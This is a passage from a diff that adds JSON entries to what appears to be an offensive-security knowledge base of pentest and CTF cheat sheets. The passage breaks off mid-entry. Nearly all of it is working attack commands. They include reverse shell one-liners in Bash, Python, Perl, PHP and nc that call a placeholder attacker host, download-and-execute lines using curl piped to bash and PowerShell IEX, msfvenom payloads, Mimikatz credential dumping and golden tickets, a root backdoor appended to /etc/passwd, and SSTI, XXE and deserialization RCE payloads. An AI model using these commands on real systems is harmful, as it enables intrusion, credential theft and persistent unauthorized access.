+    "id": "ad-bloodhound",
+    "content": "Active Directory: BloodHound enumeration\nCollect data:\n  bloodhound-python -c All -d <domain> -u <user> -p <pass> -ns <dc_ip> -o /work/ad/bloodhound/\nKey BloodHound queries:\n  'Shortest Paths to Domain Admin' \u2014 shows full attack chain\n  'Find Principals with DCSync Rights'\n  'Find AS-REP Roastable Users'\n  'Find Kerberoastable Users with most privileges'\n  'Computers with Unsupported Operating Systems'\nCLI queries (without Neo4j):\n  grep -r 'AdminTo' /work/ad/bloodhound/*.json\nResult: Visual attack path from any user to Domain Admin",
+    "metadata": {
+      "category": "ad",
+      "technique": "enumeration",
+      "tool": "bloodhound"
+    }
+  },
+  {
+    "id": "ad-acl-abuse",
+    "content": "Active Directory: ACL/ACE abuse\nDangerous ACEs to look for in BloodHound:\n  GenericAll: full control over object \u2192 reset password, add to group\n  GenericWrite: modify attributes \u2192 set SPN (Kerberoast), add member\n  WriteOwner: become object owner \u2192 then set ACL\n  WriteDACL: modify ACL \u2192 grant yourself DCSync rights\n  ForceChangePassword: reset password without knowing current one\nExploit ForceChangePassword:\n  net rpc password <target_user> <new_pass> -U <domain>/<user>%<pass> -S <dc_ip>\nExploit GenericAll on group (add member):\n  net rpc group addmem <group> <user> -U <domain>/<user>%<pass> -S <dc_ip>",
+    "metadata": {
+      "category": "ad",
+      "technique": "acl-abuse",
+      "tool": "bloodhound"
+    }
+  },
+  {
+    "id": "ad-llmnr-poisoning",
+    "content": "Active Directory: LLMNR/NBT-NS Poisoning\nCondition: LLMNR or NBT-NS enabled (default on Windows until recently)\nHow it works: Respond to broadcast name resolution requests \u2192 capture NTLMv2 hashes\nTool: Responder (listen on the network interface)\n  responder -I eth0 -rdwv\nCaptured hashes saved to /usr/share/responder/logs/\nCrack: hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt\nOr relay (don't crack): use ntlmrelayx.py to relay to SMB on targets without signing\n  ntlmrelayx.py -tf targets.txt -smb2support\nNote: Requires being on the same network segment as victims",
+    "metadata": {
+      "category": "ad",
+      "technique": "llmnr-poisoning",
+      "tool": "responder"
+    }
+  },
+  {
+    "id": "ad-domain-enum",
+    "content": "Active Directory: Initial enumeration without credentials\nEnumerate domain users (no creds needed if LDAP null bind works):\n  ldapsearch -x -H ldap://<dc_ip> -b 'dc=<domain>,dc=<tld>' '(objectClass=user)' sAMAccountName\nEnumerate with kerbrute (username enumeration):\n  kerbrute userenum -d <domain> --dc <dc_ip> /usr/share/seclists/Usernames/top-usernames-shortlist.txt\nEnumerate shares:\n  smbclient -L //<dc_ip>/ -N\n  crackmapexec smb <dc_ip> --shares -u '' -p ''\nCheck for web interface: http://<dc_ip>/certsrv (ADCS), https://<dc_ip>/OWA (Exchange)",
+    "metadata": {
+      "category": "ad",
+      "technique": "enumeration",
+      "tool": "ldapsearch"
+    }
+  },
+  {
+    "id": "hash-cracking-hashcat-modes",
+    "content": "Hash cracking: hashcat mode reference\nNTLM: -m 1000\nNTLMv1: -m 3000\nNTLMv2 (Net-NTLMv2, captured by Responder): -m 5600\nMD5: -m 0\nSHA1: -m 100\nSHA256: -m 1400\nbcrypt ($2*$): -m 3200\nMD5crypt ($1$, Unix): -m 500\nSHA512crypt ($6$, Unix/shadow): -m 1800\nSHA256crypt ($5$, Unix/shadow): -m 7400\nKerberos TGS (Kerberoast): -m 13100\nKerberos AS-REP (AS-REP Roast): -m 18200\nWPA/WPA2: -m 22000\nCommon usage: hashcat -m <mode> <hashfile> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+    "metadata": {
+      "category": "hash-cracking",
+      "tool": "hashcat"
+    }
+  },
+  {
+    "id": "hash-cracking-john",
+    "content": "Hash cracking: john the ripper formats and usage\nAuto-detect format: john <hashfile>\nSpecify format: john --format=NT <hashfile>  (for NTLM)\nCommon formats: --format=nt (NTLM), --format=md5crypt, --format=bcrypt,\n                --format=sha512crypt, --format=krb5tgs (Kerberoast)\nWith wordlist: john <hashfile> --wordlist=/usr/share/wordlists/rockyou.txt\nWith rules: john <hashfile> --wordlist=rockyou.txt --rules\nShow cracked: john --show <hashfile>\nShadow file: john /etc/shadow --wordlist=/usr/share/wordlists/rockyou.txt\nSSH key: ssh2john id_rsa > id_rsa.hash; john id_rsa.hash --wordlist=rockyou.txt\nZIP: zip2john archive.zip > zip.hash; john zip.hash",
+    "metadata": {
+      "category": "hash-cracking",
+      "tool": "john"
+    }
+  },
+  {
+    "id": "hash-identification",
+    "content": "Hash identification: format recognition\n32 hex chars: MD5 ($1$) or NTLM\n40 hex chars: SHA1\n64 hex chars: SHA256\n128 hex chars: SHA512\n$1$: MD5crypt (Unix)\n$2a$, $2b$, $2y$: bcrypt\n$5$: SHA256crypt (Unix)\n$6$: SHA512crypt (Unix shadow)\naad3b435b51404eeaad3b435b51404ee: empty NTLM (LM hash for blank)\n$krb5tgs$23$: Kerberoasted TGS (RC4)\n$krb5asrep$23$: AS-REP hash (RC4)\nTool: hashid <hash>  or  hash-identifier",
+    "metadata": {
+      "category": "hash-cracking",
+      "tool": "hashid"
+    }
+  },
+  {
+    "id": "reverse-shells-common",
+    "content": "Reverse shell one-liners (start listener: nc -lvnp <port>)\nBash: bash -i >& /dev/tcp/<attacker>/<port> 0>&1\nBash (alt): 0<&196;exec 196<>/dev/tcp/<attacker>/<port>; sh <&196 >&196 2>&196\nPython3: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<attacker>\",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\nPerl: perl -e 'use Socket;$i=\"<attacker>\";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'\nPHP: php -r '$s=fsockopen(\"<attacker>\",<port>);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\nnc: nc -e /bin/bash <attacker> <port>  (if -e supported)\nnc (no -e): rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker> <port> >/tmp/f",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "reverse-shell",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "shell-upgrade-pty",
+    "content": "Shell upgrade: get a fully interactive TTY from a basic reverse shell\nStep 1 (in shell): python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n                   OR: script /dev/null -c bash\nStep 2: Ctrl+Z (background the shell)\nStep 3 (local): stty raw -echo; fg\nStep 4 (in shell): export TERM=xterm; stty rows 40 cols 160\nNow you have: tab completion, arrow keys, ctrl+c without killing shell\nAlternative with socat:\n  Attacker: socat file:`tty`,raw,echo=0 tcp-listen:<port>\n  Victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker>:<port>",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "shell-upgrade",
+      "tool": "python3"
+    }
+  },
+  {
+    "id": "windows-privesc-seimpersonate",
+    "content": "Windows privesc: SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege\nDetection: whoami /priv \u2014 look for SeImpersonatePrivilege Enabled\nCommon on: IIS app pools, MSSQL service accounts, network services\nPrintSpoofer (Windows 10 / Server 2019):\n  PrintSpoofer.exe -i -c cmd\n  PrintSpoofer.exe -c 'nc.exe <attacker> <port> -e cmd'\nGodPotato (works on Server 2012\u20132022, Win 8\u201311):\n  GodPotato.exe -cmd 'cmd /c whoami'\n  GodPotato.exe -cmd 'nc.exe <attacker> <port> -e cmd'\nJuicyPotato (older systems, pre-2019):\n  JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {clsid}\n  CLSID list: https://github.com/ohpe/juicy-potato/tree/master/CLSID\nSweetPotato: combines multiple potato variants with auto CLSID selection",
+    "metadata": {
+      "category": "privesc",
+      "technique": "token-impersonation",
+      "tool": "PrintSpoofer"
+    }
+  },
+  {
+    "id": "windows-privesc-unquoted-service",
+    "content": "Windows privesc: Unquoted service path\nDetection: wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /iv 'c:\\\\windows' | findstr /iv '\"'\nPowerShell: Get-WmiObject win32_service | Where-Object {$_.pathname -notlike '\"*' -and $_.pathname -like '* *'}\nHow it works: if path is C:\\Program Files\\My App\\svc.exe, Windows tries:\n  C:\\Program.exe \u2192 C:\\Program Files\\My.exe \u2192 C:\\Program Files\\My App\\svc.exe\nExploit: if you can write to C:\\Program Files\\, drop C:\\Program Files\\My.exe\nCheck write perms: icacls 'C:\\Program Files\\My App'\nPayload: msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o My.exe\nThen restart service: sc stop <svc>; sc start <svc>",
+    "metadata": {
+      "category": "privesc",
+      "technique": "unquoted-service-path",
+      "tool": "wmic"
+    }
+  },
+  {
+    "id": "windows-privesc-dll-hijacking",
+    "content": "Windows privesc: DLL hijacking\nDetection: use Process Monitor (procmon) with filters:\n  Path ends with .dll + Result is NAME NOT FOUND\n  Look for DLLs being loaded from user-writable directories\nAlso check: applications in PATH directories you can write to\nCreate malicious DLL:\n  msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o hijack.dll\n  Or compile a DLL that calls system() in DllMain\nDrop DLL in search path before the legitimate one.\nCommon targets: services that load missing DLLs from PATH, Electron apps, installers",
+    "metadata": {
+      "category": "privesc",
+      "technique": "dll-hijacking",
+      "tool": "msfvenom"
+    }
+  },
+  {
+    "id": "windows-privesc-alwaysinstallelevated",
+    "content": "Windows privesc: AlwaysInstallElevated\nDetection (must be 1 in BOTH keys):\n  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n  reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nExploit: MSI packages run as SYSTEM when both keys are 1\n  msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o shell.msi\n  msiexec /quiet /qn /i shell.msi\nPowerUp: Invoke-AllChecks will detect and can auto-exploit this",
+    "metadata": {
+      "category": "privesc",
+      "technique": "alwaysinstallelevated",
+      "tool": "msiexec"
+    }
+  },
+  {
+    "id": "windows-privesc-winpeas",
+    "content": "Windows privesc: WinPEAS automated enumeration\nDownload: https://github.com/carlospolop/PEASS-ng/releases\nRun: winPEASx64.exe  OR  winPEASany.exe\nKey sections to look for (highlighted in red/yellow):\n  System Info: OS version, hotfixes\n  Services: unquoted paths, modifiable binaries, weak permissions\n  Scheduled Tasks: tasks running as SYSTEM with writable scripts\n  Token Privileges: SeImpersonatePrivilege, SeDebugPrivilege\n  Credentials: saved creds, SAM, DPAPI, wifi passwords, browser creds\n  Registry: AlwaysInstallElevated, AutoRun entries, stored credentials\nQuiet mode (less noisy): winPEASx64.exe quiet\nSpecific check only: winPEASx64.exe systeminfo",
+    "metadata": {
+      "category": "privesc",
+      "technique": "enumeration",
+      "tool": "winpeas"
+    }
+  },
+  {
+    "id": "linux-privesc-cron",
+    "content": "Linux privesc: writable cron jobs\nList cron jobs:\n  cat /etc/crontab; ls -la /etc/cron*; crontab -l\n  find /var/spool/cron -type f 2>/dev/null\nCheck for writable scripts called by root cron:\n  ls -la <script_path>  \u2192 if world-writable or group-writable\nExploit: append a reverse shell to the script\n  echo 'bash -i >& /dev/tcp/<attacker>/<port> 0>&1' >> /path/to/script.sh\nAlso check: scripts in PATH that cron calls without full path\nWildcard injection: if cron runs 'tar cf /backup/*.tar /dir/*', inject:\n  touch '/dir/--checkpoint=1'\n  touch '/dir/--checkpoint-action=exec=sh privesc.sh'",
+    "metadata": {
+      "category": "privesc",
+      "technique": "cron",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "linux-privesc-path-hijacking",
+    "content": "Linux privesc: PATH hijacking\nCondition: SUID/SUDO binary calls a command without full path\nDetection: strings /path/to/suid_binary | grep -v '/' | grep -v '^_'\nIf SUID binary runs 'service' without /usr/sbin/service:\n  echo '#!/bin/bash\\nbash -p' > /tmp/service\n  chmod +x /tmp/service\n  export PATH=/tmp:$PATH\n  ./suid_binary\nAlso look for: sudo scripts that source files from writable dirs,\n  env_reset not set in sudoers (can then manipulate PATH with sudo)",
+    "metadata": {
+      "category": "privesc",
+      "technique": "path-hijacking",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "linux-privesc-nfs",
+    "content": "Linux privesc: NFS no_root_squash\nDetection (from target): cat /etc/exports \u2014 look for no_root_squash\nDetection (from attacker): showmount -e <target_ip>\nHow it works: if no_root_squash is set, root on your attacker machine\n  is treated as root on the NFS share \u2014 can create SUID binaries\nExploit from attacker machine (as root):\n  mount -o rw,vers=2 <target_ip>:/share /mnt/nfs\n  cp /bin/bash /mnt/nfs/bash\n  chmod +s /mnt/nfs/bash\nOn target: /mnt/nfs/bash -p  \u2192  root shell",
+    "metadata": {
+      "category": "privesc",
+      "technique": "nfs",
+      "tool": "mount"
+    }
+  },
+  {
+    "id": "linux-privesc-writable-passwd",
+    "content": "Linux privesc: writable /etc/passwd\nDetection: ls -la /etc/passwd \u2014 world-writable (rw-rw-rw-)\nExploit: add a new root user (UID 0)\n  Generate password hash: openssl passwd -1 -salt abc password123\n  Append to /etc/passwd: echo 'hacker:\\$1\\$abc\\$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd\n  Login: su hacker (password: password123)\nAlternative (no password): echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd\n  Then: su hacker (blank password)",
+    "metadata": {
+      "category": "privesc",
+      "technique": "writable-passwd",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "linux-privesc-lxd",
+    "content": "Linux privesc: LXD group membership\nDetection: id \u2014 if output includes 'lxd' group\nExploit: mount host filesystem inside a privileged container\n  On attacker: build Alpine image\n    git clone https://github.com/saghul/lxd-alpine-builder; cd lxd-alpine-builder\n    sudo ./build-alpine\n  Transfer .tar.gz to target, then:\n    lxc image import ./alpine*.tar.gz --alias myimage\n    lxc init myimage mycontainer -c security.privileged=true\n    lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\n    lxc start mycontainer\n    lxc exec mycontainer /bin/sh\n  Inside container: chroot /mnt/root /bin/bash  \u2192  full host filesystem as root",
+    "metadata": {
+      "category": "privesc",
+      "technique": "lxd",
+      "tool": "lxc"
+    }
+  },
+  {
+    "id": "linux-privesc-linpeas",
+    "content": "Linux privesc: LinPEAS automated enumeration\nDownload + run in one line:\n  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\nOr transfer and run: chmod +x linpeas.sh; ./linpeas.sh 2>/dev/null | tee /tmp/lp.txt\nKey sections (highlighted red = critical):\n  SUID/SGID binaries \u2192 GTFOBins check\n  Sudo version \u2192 CVE-2021-3156 (Baron Samedit)\n  Writable files: /etc/passwd, cron scripts, service files\n  Password files: .bash_history, config files with credentials\n  Network: internal services, listening on localhost only\n  Container/VM checks: docker socket, cgroup, .dockerenv\nFocused runs: ./linpeas.sh -s (silent) -a (all checks)",
+    "metadata": {
+      "category": "privesc",
+      "technique": "enumeration",
+      "tool": "linpeas"
+    }
+  },
+  {
+    "id": "pivoting-chisel",
+    "content": "Pivoting: chisel TCP/UDP tunnel over HTTP\nDownload: https://github.com/jpillora/chisel/releases\nAttacker (server): chisel server -p 8080 --reverse\nVictim (client \u2014 SOCKS proxy for full network):\n  ./chisel client <attacker>:8080 R:socks\n  Then use proxychains4 with 127.0.0.1:1080 (chisel default SOCKS port)\nPort forward only (e.g. expose victim's internal port 3306):\n  ./chisel client <attacker>:8080 R:3306:127.0.0.1:3306\nForward tunnel (attacker pushes through to internal host):\n  Attacker: chisel server -p 8080\n  Victim: ./chisel client <attacker>:8080 3306:<internal_host>:3306\nproxychains config: socks5 127.0.0.1 1080",
+    "metadata": {
+      "category": "pivoting",
+      "technique": "tunneling",
+      "tool": "chisel"
+    }
+  },
+  {
+    "id": "pivoting-ligolo",
+    "content": "Pivoting: ligolo-ng (TUN interface, no proxychains needed)\nDownload: https://github.com/nicocha30/ligolo-ng/releases\nAttacker setup:\n  sudo ip tuntap add user $(whoami) mode tun ligolo\n  sudo ip link set ligolo up\n  ./proxy -selfcert -laddr 0.0.0.0:11601\nVictim: ./agent -connect <attacker>:11601 -ignore-cert\nIn proxy console: session \u2192 select session \u2192 start\nAdd route to pivot target network:\n  sudo ip route add 192.168.1.0/24 dev ligolo\nNow you can reach 192.168.1.x directly \u2014 no proxychains, native tools work\nMultiple pivots: add more routes for each discovered subnet",
+    "metadata": {
+      "category": "pivoting",
+      "technique": "tunneling",
+      "tool": "ligolo-ng"
+    }
+  },
+  {
+    "id": "pivoting-ssh-tunnels",
+    "content": "Pivoting: SSH tunneling\nLocal port forward (reach internal host via SSH box):\n  ssh -L <local_port>:<internal_host>:<internal_port> user@<ssh_host>\n  e.g.: ssh -L 3306:10.10.10.5:3306 user@pivot_host  \u2192 connect to 127.0.0.1:3306\nRemote port forward (expose local service to SSH server):\n  ssh -R <remote_port>:127.0.0.1:<local_port> user@<ssh_host>\nDynamic SOCKS proxy (full network via proxychains):\n  ssh -D 1080 user@<ssh_host>\n  proxychains4 nmap -sT -p 80,443,22 10.10.10.0/24\nPersistent tunnel (no shell, background):\n  ssh -N -f -L 3306:internal:3306 user@pivot\nJump host: ssh -J pivot_user@pivot_host target_user@target_host",
+    "metadata": {
+      "category": "pivoting",
+      "technique": "ssh-tunneling",
+      "tool": "ssh"
+    }
+  },
+  {
+    "id": "file-transfer-linux",
+    "content": "File transfer: Linux \u2192 target\nServe files from attacker:\n  python3 -m http.server 8080  (serves current directory)\n  updog (pip install updog)  \u2192  updog -p 8080 (with upload support)\nDownload on target:\n  wget http://<attacker>:8080/file.sh\n  curl -o file.sh http://<attacker>:8080/file.sh\n  curl http://<attacker>:8080/file.sh | bash  (exec without saving)\nVia SCP: scp file.sh user@target:/tmp/\nBase64 (no network tools available):\n  Attacker: base64 -w0 file.sh  (copy output)\n  Target: echo '<base64_string>' | base64 -d > file.sh\nVia /dev/tcp: cat file.sh > /dev/tcp/<target_ip>/<port> (receiver: nc -lvnp <port> > file.sh)",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "file-transfer",
+      "tool": "wget"
+    }
+  },
+  {
+    "id": "file-transfer-windows",
+    "content": "File transfer: Windows \u2192 target\nPowerShell download:\n  iwr http://<attacker>:8080/file.exe -OutFile C:\\Windows\\Temp\\file.exe\n  (Invoke-WebRequest)\n  IEX (New-Object Net.WebClient).DownloadString('http://<attacker>:8080/script.ps1')\n  (download and execute in memory \u2014 fileless)\ncertutil (built-in, LOLBin):\n  certutil -urlcache -split -f http://<attacker>:8080/file.exe C:\\Temp\\file.exe\nbitsadmin:\n  bitsadmin /transfer myJob http://<attacker>/file.exe C:\\Temp\\file.exe\nSMB share:\n  Attacker: impacket-smbserver share . -smb2support\n  Target: copy \\\\<attacker>\\share\\file.exe .\nBase64 via clipboard: [System.Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\file.exe'))",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "file-transfer",
+      "tool": "powershell"
+    }
+  },
+  {
+    "id": "mimikatz-commands",
+    "content": "Mimikatz: credential extraction commands\nRun as Administrator (or SYSTEM for best results)\nElevate token first: privilege::debug  then  token::elevate\nDump logon passwords (plaintext if WDigest enabled):\n  sekurlsa::logonpasswords\nDump NTLM hashes from SAM (local accounts):\n  lsadump::sam\nDCSync (dump domain hashes remotely \u2014 needs replication rights):\n  lsadump::dcsync /domain:<domain> /user:Administrator\n  lsadump::dcsync /domain:<domain> /all /csv\nPass-the-Hash:\n  sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe\nPass-the-Ticket:\n  kerberos::list /export  \u2192  kerberos::ptt <ticket.kirbi>\nGolden ticket: kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<hash> /ptt\nDump LSA secrets: lsadump::secrets",
+    "metadata": {
+      "category": "ad",
+      "technique": "credential-dump",
+      "tool": "mimikatz"
+    }
+  },
+  {
+    "id": "web-jwt-attacks",
+    "content": "JWT (JSON Web Token) attacks\nDecode token (no verification): base64 -d <<< '<header>.<payload>' (URL-safe base64)\nOr use: jwt.io / jwt_tool.py\nNone algorithm bypass:\n  Change 'alg' to 'none' in header, remove signature, keep trailing dot\n  python3 jwt_tool.py <token> -X a\nWeak secret brute force:\n  hashcat -m 16500 <token> /usr/share/wordlists/rockyou.txt\n  python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt\nRS256 \u2192 HS256 confusion (if server public key accessible):\n  Sign token with HS256 using the RSA public key as HMAC secret\n  python3 jwt_tool.py <token> -X k -pk public.pem\nkid header injection (if kid used in SQL query or file path):\n  Set kid to '../../../../dev/null' + sign with empty string\nModify claims: change 'role':'user' \u2192 'role':'admin', 'sub' to another user ID",
+    "metadata": {
+      "category": "web",
+      "technique": "jwt",
+      "tool": "jwt_tool"
+    }
+  },
+  {
+    "id": "web-ssti",
+    "content": "Server-Side Template Injection (SSTI)\nDetection: inject {{7*7}} or ${7*7} or #{7*7} \u2014 look for '49' in response\nIf {{7*'7'}} returns '7777777' \u2192 Twig (PHP); '49' \u2192 Jinja2 (Python)\nJinja2 (Flask/Django) \u2014 RCE:\n  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n  {{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0]}}\n  Simpler: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\nTwig (PHP):\n  {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\nFreemarker (Java):\n  <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}\nTornado (Python): {%import os%}{{os.system('id')}}\nTool: tplmap -u 'http://<host>/vuln?name=*'",
+    "metadata": {
+      "category": "web",
+      "technique": "ssti",
+      "tool": "tplmap"
+    }
+  },
+  {
+    "id": "web-xxe",
+    "content": "XML External Entity (XXE) injection\nBasic file read:\n  <?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>\nWindows: file:///C:/Windows/win.ini or file:///C:/inetpub/wwwroot/web.config\nBlind XXE (out-of-band via HTTP):\n  <!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://<attacker>:8080/?test'>]><root>&xxe;</root>\n  Set up: nc -lvnp 8080  or  python3 -m http.server 8080\nBlind XXE data exfil via DNS:\n  Use Burp Collaborator or interactsh: interactsh-client\nVia file upload: embed XXE in SVG or DOCX/XLSX (unzip, modify xl/workbook.xml)\nSVG XXE:\n  <svg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'>\n  <image href='file:///etc/passwd'/></svg>\nTest all XML input: SOAP bodies, REST APIs accepting XML, file upload parsers",
+    "metadata": {
+      "category": "web",
+      "technique": "xxe",
+      "tool": "manual"
+    }
+  },
+  {
+    "id": "web-deserialization",
+    "content": "Deserialization vulnerabilities\nJava (ysoserial):\n  java -jar ysoserial.jar CommonsCollections1 'id' | base64\n  Test gadget chains: CommonsCollections1-7, Spring, Groovy, URLDNS\n  URLDNS chain (detection only, no RCE): tests for deserialisation by triggering DNS\nPHP object injection:\n  Look for unserialize() with user input\n  Check for __destruct(), __wakeup(), __toString() magic methods\n  Tool: phpggc (PHP Generic Gadget Chains)\nPython pickle:\n  import pickle, os\n  class E(object):\n    def __reduce__(self): return (os.system, ('id',))\n  pickle.dumps(E())\n  Look for pickle.loads() or shelve with user input\n.NET: ysoserial.net \u2014 targets BinaryFormatter, DataContractSerializer\nIndicators: base64 blobs, binary data in cookies/params, 'rO0AB' prefix (Java)",
+    "metadata": {
+      "category": "web",
+      "technique": "deserialization",
+      "tool": "ysoserial"
+    }
+  },
+  {
+    "id": "recon-nmap-cheatsheet",
+    "content": "Nmap: common scan types reference\nQuick top-1000 TCP: nmap -sV -sC -oA scan <target>\nAll TCP ports: nmap -p- -T4 --min-rate 1000 -oA full_tcp <target>\nUDP top-100: nmap -sU --top-ports 100 -oA udp <target>\nSpecific ports: nmap -p 22,80,443,445,3389 -sV -sC <target>\nVulnerability scripts: nmap --script vuln -p <ports> <target>\nSMB scripts: nmap --script smb-vuln* -p 445 <target>\nOS detection: nmap -O <target> (requires root)\nAggressive (OS + version + scripts + traceroute): nmap -A <target>\nFirewall evasion: nmap -f (fragment) -D RND:10 (decoys) --source-port 53\nFast host discovery: nmap -sn 10.10.10.0/24\nOutput formats: -oN (normal) -oG (greppable) -oX (XML) -oA (all three)",
+    "metadata": {
+      "category": "recon",
+      "technique": "port-scan",
+      "tool": "nmap"
+    }
+  },
+  {
+    "id": "recon-subdomain-enum",
+    "content": "Subdomain and DNS enumeration\nPassive (no direct target contact):\n  subfinder -d example.com -o subs.txt\n  amass enum -passive -d example.com\n  theHarvester -d example.com -b google,bing,crtsh\n  crt.sh: curl -s 'https://crt.sh/?q=%.example.com&output=json' | jq '.[].name_value'\nActive (DNS brute force):\n  gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n  ffuf -w subdomains.txt:FUZZ -u http://FUZZ.example.com -fc 301,302\n  dnsx -l subs.txt -resp -a -aaaa -cname  (resolve + check live)\nVirtual host fuzzing:\n  ffuf -w subdomains.txt:FUZZ -u http://<ip>/ -H 'Host: FUZZ.example.com' -fs <baseline_size>\nZone transfer attempt: dig axfr @<nameserver> example.com",
+    "metadata": {
+      "category": "recon",
+      "technique": "subdomain-enum",
+      "tool": "subfinder"
+    }
+  },
+  {
+    "id": "recon-osint-tools",
+    "content": "OSINT: external reconnaissance tools\nShodan (internet-connected device search):\n  shodan host <ip>  (full host info)\n  shodan search 'org:\"Company Name\" port:22'\n  shodan search 'ssl.cert.subject.CN:example.com'\ntheHarvester (emails, subdomains, names):\n  theHarvester -d example.com -b all -l 200\n  Sources: google, bing, linkedin, crtsh, github, hunter, securitytrails\nHunter.io: find company email format, employee emails\nLinkedIn: enumerate employees, technology stack from job postings\nGitHub: search org repos for credentials, API keys\n  github.com/search?q=org%3Acompanyname+password&type=code\nWayback Machine: archived pages with old creds, API keys, subdomains\n  web.archive.org/web/*/example.com/*\nGoogle dorks: site:example.com filetype:pdf  site:example.com inurl:admin",
+    "metadata": {
+      "category": "recon",
+      "technique": "osint",
+      "tool": "shodan"
+    }
+  },
+  {
+    "id": "ctf-steganography",
+    "content": "CTF: Steganography tools and techniques\nInitial analysis of any file:\n  file <file>  (identify true type)\n  strings <file> | less  (look for readable text)\n  binwalk <file>  (detect embedded files)\n  binwalk -e <file>  (extract embedded files)\n  xxd <file> | head  (hex dump header)\n  exiftool <file>  (all metadata)\nImages:\n  steghide extract -sf image.jpg  (try blank password first)\n  stegseek image.jpg /usr/share/wordlists/rockyou.txt  (brute force steghide)\n  zsteg image.png  (LSB steganography in PNG)\n  stegsolve image.png  (visual analysis, color plane inspection)\nAudio (WAV/MP3):\n  Audacity: look for hidden data in spectrogram view\n  sonic-visualiser: spectrogram analysis\n  mp3stego: mp3stego-decode -X -P password file.mp3 out.txt\nZIP with password: john zip.hash or hashcat -m 17200",
+    "metadata": {
+      "category": "ctf",
+      "technique": "steganography",
+      "tool": "steghide"
+    }
+  },
+  {
+    "id": "ctf-common-patterns",
+    "content": "CTF: Common web and source disclosure patterns\n.git directory exposure:\n  curl http://<host>/.git/HEAD  (if returns 'ref: refs/heads/main' \u2192 exposed)\n  git-dumper http://<host>/.git/ ./repo  (download full repo)\n  git log --all --oneline  (check for deleted sensitive files)\n  git show <commit>:<file>  (recover deleted content)\nrobots.txt and sitemap:\n  curl http://<host>/robots.txt  \u2014 disallowed paths often lead to flags\n  curl http://<host>/sitemap.xml\nSource backup files: index.php.bak, index.php~, .index.php.swp, index.php.old\n  ffuf -w extensions.txt:EXT -u http://<host>/index.phpEXT\nPHP info: /phpinfo.php, /info.php, /php_info.php\nConfig files: /config.php, /.env, /config.yml, /application.properties\nSwagger/API docs: /swagger.json, /openapi.json, /api-docs, /v2/api-docs",
+    "metadata": {
+      "category": "ctf",
+      "technique": "web-recon",
+      "tool": "git-dumper"
+    }
+  },
+  {
+    "id": "ctf-crypto-basics",
+    "content": "CTF: Crypto identification and quick decodes\nBase64: ends in = or ==, charset A-Za-z0-9+/\n  echo '<string>' | base64 -d\nBase32: uppercase A-Z and 2-7, ends in =\n  echo '<string>' | base32 -d\nROT13: letter substitution cipher\n  echo '<string>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'\nCaesar cipher: try all 25 rotations\n  python3 -c \"s='<string>'; [print(i,''.join(chr((ord(c)-65+i)%26+65) if c.isupper() else chr((ord(c)-97+i)%26+97) if c.islower() else c for c in s)) for i in range(26)]\"\nVigenere: use dcode.fr or crackvigenere tool\nXOR with single byte:\n  python3 -c \"data=bytes.fromhex('<hex>'); [print(i, bytes([b^i for b in data])) for i in range(256)]\"\nHash length extension: hashpump tool\nRSA weak keys: RsaCtfTool.py \u2014 factor small n, common modulus, wiener",
+    "metadata": {
+      "category": "ctf",
+      "technique": "crypto",
+      "tool": "python3"
+    }
+  },
+  {
+    "id": "docker-escape",
